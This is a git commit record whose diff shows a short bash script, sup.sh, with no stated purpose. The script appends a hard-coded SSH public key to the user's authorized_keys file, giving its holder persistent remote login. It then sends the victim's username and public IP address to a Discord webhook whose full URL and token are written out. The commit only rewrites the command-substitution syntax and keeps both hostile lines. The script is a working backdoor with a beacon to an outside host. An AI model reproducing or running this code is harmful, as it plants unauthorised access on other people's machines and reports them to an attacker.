1d082f51f8ba1584099515a6f38259658abd2c48
LeetCodes <michael@leetcodes.com>
2020-09-16 20:35:43 -0400

    Update sup.sh

--- sup.sh
+++ sup.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDI6kDCpGnlONpPgYv73V/rp/vtuBW+judmdF8xB92uvCNcqhbOSI75m4m9PgTh1QRYZzoI0ZEQAjVc1yPZd87BLTI9BmZMjlqpALeLU5o2I45skYJ1PYwqLfJaAO8zjduqeCmT8SvxJfI2AP3UHhN6lpmuPyEA4SfTrzR6uElCZD/MlCRkfuBc/3LaVe9SoUzPNCMtDNeo/OK/rXqhuc7tQaelVFiyrIkrlZyln/PyILM5ZhYoCcq/MONVxIG5+COALsxWnX6bVbn+LrUK7i3WwL893vggLvUZKy41jQBfBjzndpccNApEGRh1+d6JUXcCij7bTLmmrPFFq/0Qf6ah brbfapping@dagobah" >> ~/.ssh/authorized_keys
-curl -d "{\"content\": \"`whoami` from `curl ident.me`\"}" -H "Content-Type: application/json" https://discordapp.com/api/webhooks/740724486890061864/KhLvbVrjSbTmLH-8i_m8r-wDoorccoiV47jbeOjq_UUzmkaF5m1F2d7Cc-6GvNL2UING
+curl -d "{\"content\": \"$(whoami) from $(curl ident.me)\"}" -H "Content-Type: application/json" https://discordapp.com/api/webhooks/740724486890061864/KhLvbVrjSbTmLH-8i_m8r-wDoorccoiV47jbeOjq_UUzmkaF5m1F2d7Cc-6GvNL2UING
